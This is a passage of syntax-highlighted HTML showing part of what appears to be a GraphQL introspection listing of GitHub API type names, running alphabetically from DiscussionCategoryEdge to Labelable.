class="string">&quot;DiscussionCategoryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissPullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissPullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissRepositoryVulnerabilityAlertInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DismissRepositoryVulnerabilityAlertPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DraftPullRequestReviewComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DraftPullRequestReviewThread&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnablePullRequestAutoMergeInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnablePullRequestAutoMergePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Enterprise&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorInvitationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAdministratorRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseAuditEntryData&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseBillingInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseDefaultRepositoryPermissionSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseEnabledDisabledSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseEnabledSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseIdentityProvider&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMember&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMemberConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMemberEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMemberOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMemberOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMembersCanCreateRepositoriesSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseMembersCanMakePurchasesSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOrganizationMembershipConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOrganizationMembershipEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOutsideCollaboratorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOutsideCollaboratorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseOwnerInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterprisePendingMemberInvitationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterprisePendingMemberInvitationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseRepositoryInfo&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseRepositoryInfoConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseRepositoryInfoEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallation&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallationConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallationEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallationOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerInstallationOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccount&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmail&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmailConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmailEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmailOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountEmailOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUpload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseServerUserAccountsUploadSyncState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserAccount&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserAccountConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserAccountEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserAccountMembershipRole&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnterpriseUserDeployment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Environment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnvironmentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;EnvironmentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentity&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentityConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentityEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentitySamlAttributes&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ExternalIdentityScimAttributes&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FileAddition&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FileChanges&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FileDeletion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FileViewedState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Float&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FollowUserInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FollowUserPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FollowerConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FollowingConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FundingLink&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;FundingPlatform&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GenericHovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Gist&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistFile&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GistPrivacy&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitActor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitActorConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitActorEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitHubMetadata&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitObject&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitObjectID&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitSSHRemote&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitSignature&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitSignatureState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GitTimestamp&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GpgSignature&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GrantEnterpriseOrganizationsMigratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GrantEnterpriseOrganizationsMigratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GrantMigratorRoleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;GrantMigratorRolePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HTML&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HeadRefDeletedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HeadRefForcePushedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HeadRefRestoredEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Hovercard&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;HovercardContext&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ID&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IdentityProviderConfigurationState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Int&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;InviteEnterpriseAdminInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;InviteEnterpriseAdminPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEnabledSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntry&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntryEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntryOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListEntryOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListForInstalledAppsEnabledSettingValue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IpAllowListOwner&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Issue&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueCommentOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueCommentOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueContributionsByRepository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueFilters&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueOrPullRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTemplate&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItemEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItems&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItemsConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItemsEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;IssueTimelineItemsItemType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;JoinedGitHubContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Label&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabelConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabelEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabelOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;LabelOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Labelable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        